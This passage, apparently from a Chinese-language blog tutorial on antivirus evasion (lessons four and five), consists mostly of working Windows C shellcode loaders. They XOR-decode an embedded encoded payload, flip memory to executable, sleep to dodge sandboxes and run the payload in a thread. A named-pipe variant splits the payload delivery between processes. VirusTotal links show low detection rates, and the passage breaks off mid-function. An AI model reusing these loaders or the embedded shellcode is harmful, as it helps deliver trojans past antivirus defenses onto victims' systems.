<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a"</span><span class="token punctuation">;</span>


<span class="token comment">// 获取shellcode大小</span>
shellcode_size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/* 增加异或代码 */</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>shellcode_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_InterlockedXor8</span><span class="token punctuation">(</span>buf<span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">/*
VirtualAlloc(
    NULL, // 基址
    800,  // 大小
    MEM_COMMIT, // 内存页状态
    PAGE_EXECUTE_READWRITE // 可读可写可执行
    );
*/</span>

<span class="token keyword">char</span> <span class="token operator">*</span> shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span>
    shellcode_size<span class="token punctuation">,</span>
    MEM_COMMIT<span class="token punctuation">,</span>
    PAGE_READWRITE <span class="token comment">// 只申请可读可写</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 将shellcode复制到可读可写的内存页中</span>
<span class="token function">CopyMemory</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>shellcode_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 这里开始更改它的属性为可执行</span>
<span class="token function">VirtualProtect</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>shellcode_size<span class="token punctuation">,</span>PAGE_EXECUTE<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span>
<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 安全描述符</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 栈的大小</span>
    <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>shellcode<span class="token punctuation">,</span> <span class="token comment">// 函数</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 参数</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 线程标志</span>
    <span class="token operator">&amp;</span>dwThreadId <span class="token comment">// 线程ID</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span>INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 一直等待线程执行结束</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>virustotal<span class="token punctuation">.</span>com<span class="token operator">/</span>gui<span class="token operator">/</span>file<span class="token operator">/</span><span class="token number">07</span>cd0fc7240f2978ebfaa6211a5818dcbbd12a76ec670d219b7a9b559e7bf9d2<span class="token operator">/</span>detection
</code></pre>
<hr>
<h2><a id="9110__948"></a>9.1.10 静态恶意代码逃逸（第四课）</h2>
<p><strong>0x01 分离免杀</strong></p>
<p>前六课的代码将会上传至Github，方便读者下载研究 :</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Rvn0xsy<span class="token operator">/</span>BadCode
</code></pre>
<p>分离免杀：将恶意代码放置在程序本身之外的一种加载方式。</p>
<p>前面三课主要围绕着程序本身的加载，后面的课程将围绕网络、数据共享的方式去展开</p>
<p><strong>0x02 管道</strong></p>
<p>何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。</p>
<p>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。</p>
<p>先展开本地管道来讲解：</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;intrin.h&gt;</span></span>

<span class="token macro property">#<span class="token directive keyword">define</span> BUFF_SIZE 1024</span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a"</span><span class="token punctuation">;</span>
PTCHAR ptsPipeName <span class="token operator">=</span> <span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"\\\\.\\pipe\\BadCodeTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

BOOL <span class="token function">RecvShellcode</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">{</span>
    HANDLE hPipeClient<span class="token punctuation">;</span>
    DWORD dwWritten<span class="token punctuation">;</span>
    DWORD dwShellcodeSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 等待管道可用</span>
    <span class="token function">WaitNamedPipe</span><span class="token punctuation">(</span>ptsPipeName<span class="token punctuation">,</span>NMPWAIT_WAIT_FOREVER<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 连接管道</span>
    hPipeClient <span class="token operator">=</span> <span class="token function">CreateFile</span><span class="token punctuation">(</span>ptsPipeName<span class="token punctuation">,</span>GENERIC_WRITE<span class="token punctuation">,</span>FILE_SHARE_READ<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>OPEN_EXISTING <span class="token punctuation">,</span>FILE_ATTRIBUTE_NORMAL<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>hPipeClient <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]Can't Open Pipe , Error : %d \n"</span><span class="token punctuation">,</span><span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">WriteFile</span><span class="token punctuation">(</span>hPipeClient<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>dwShellcodeSize<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwWritten<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>dwWritten <span class="token operator">==</span> dwShellcodeSize<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hPipeClient<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]Send Success ! Shellcode : %d Bytes\n"</span><span class="token punctuation">,</span>dwShellcodeSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hPipeClient<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">int</span> <span class="token function">wmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> TCHAR <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    HANDLE hPipe<span class="token punctuation">;</span>
    DWORD dwError<span class="token punctuation">;</span>
    CHAR szBuffer<span class="token punctuation">[</span>BUFF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    DWORD dwLen<span class="token punctuation">;</span>
    PCHAR pszShellcode <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    DWORD dwOldProtect<span class="token punctuation">;</span> <span class="token comment">// 内存页属性</span>
    HANDLE hThread<span class="token punctuation">;</span>
    DWORD dwThreadId<span class="token punctuation">;</span>
    <span class="token comment">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span>
    hPipe <span class="token operator">=</span> <span class="token function">CreateNamedPipe</span><span class="token punctuation">(</span>
        ptsPipeName<span class="token punctuation">,</span>
        PIPE_ACCESS_INBOUND<span class="token punctuation">,</span>
        PIPE_TYPE_BYTE<span class="token operator">|</span> PIPE_WAIT<span class="token punctuation">,</span>
        PIPE_UNLIMITED_INSTANCES<span class="token punctuation">,</span>
        BUFF_SIZE<span class="token punctuation">,</span>
        BUFF_SIZE<span class="token punctuation">,</span>
        <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>hPipe <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span><span class="token punctuation">{</span>
        dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-]Create Pipe Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> dwError<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>RecvShellcode<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ConnectNamedPipe</span><span class="token punctuation">(</span>hPipe<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]Client Connected...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ReadFile</span><span class="token punctuation">(</span>hPipe<span class="token punctuation">,</span>szBuffer<span class="token punctuation">,</span>BUFF_SIZE<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwLen<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]Get DATA Length : %d \n"</span><span class="token punctuation">,</span>dwLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 申请内存页</span>
        pszShellcode <span class="token operator">=</span> <span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span>dwLen<span class="token punctuation">,</span>MEM_COMMIT<span class="token punctuation">,</span>PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 拷贝内存</span>
        <span class="token function">CopyMemory</span><span class="token punctuation">(</span>pszShellcode<span class="token punctuation">,</span>szBuffer<span class="token punctuation">,</span>dwLen<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span><span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span> dwLen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">_InterlockedXor8</span><span class="token punctuation">(</span>pszShellcode<span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 这里开始更改它的属性为可执行</span>
        <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>pszShellcode<span class="token punctuation">,</span>dwLen<span class="token punctuation">,</span>PAGE_EXECUTE<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 执行Shellcode</span>
        hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 安全描述符</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 栈的大小</span>
            <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>pszShellcode<span class="token punctuation">,</span> <span class="token comment">// 函数</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 参数</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 线程标志</span>
            <span class="token operator">&amp;</span>dwThreadId <span class="token comment">// 线程ID</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span>INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>本实例主要是通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程。</p>
<p><img src="https://img-blog.csdnimg.cn/20201008165612932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
V站结果：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>virustotal<span class="token punctuation">.</span>com<span class="token operator">/</span>gui<span class="token operator">/</span>file<span class="token operator">/</span>b81f3d2e6b72f908c861b0b6e1f504af33ef60825b36af3d21bfe90fce160ae4<span class="token operator">/</span>detection
</code></pre>
<hr>
<h2><a id="9111__1073"></a>9.1.11 静态恶意代码逃逸（第五课）</h2>
<p><strong>0x01 真正意义上的分离</strong></p>
<p>前六课的代码将会上传至Github，方便读者下载研究 :</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Rvn0xsy<span class="token operator">/</span>BadCode
</code></pre>
<p>将上一课的代码分离开编译，然后通过管道传输，让进程通信。<br>
<img src="https://img-blog.csdnimg.cn/20201008165722375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>virustotal<span class="token punctuation">.</span>com<span class="token operator">/</span>gui<span class="token operator">/</span>file<span class="token operator">/</span><span class="token number">72</span>db045fbb839a666a5cc2d13ea5a8282756014d80827a7343344e2d5387fe44<span class="token operator">/</span>detection

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>virustotal<span class="token punctuation">.</span>com<span class="token operator">/</span>gui<span class="token operator">/</span>file<span class="token operator">/</span>d31628050d943101ff108b9b070b48f97075e295e3797aec8ab8454cc19a3d88<span class="token operator">/</span>detection
</code></pre>
<p><strong>BadCodeWithPipe</strong></p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;intrin.h&gt;</span></span>

<span class="token macro property">#<span class="token directive keyword">define</span> BUFF_SIZE 1024</span>

PTCHAR ptsPipeName <span class="token operator">=</span> <span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"\\\\.\\pipe\\BadCodeTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">wmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> TCHAR <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    HANDLE hPipe<span class="token punctuation">;</span>
    DWORD dwError<span class="token punctuation">;</span>
    CHAR szBuffer<span class="token punctuation">[</span>BUFF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
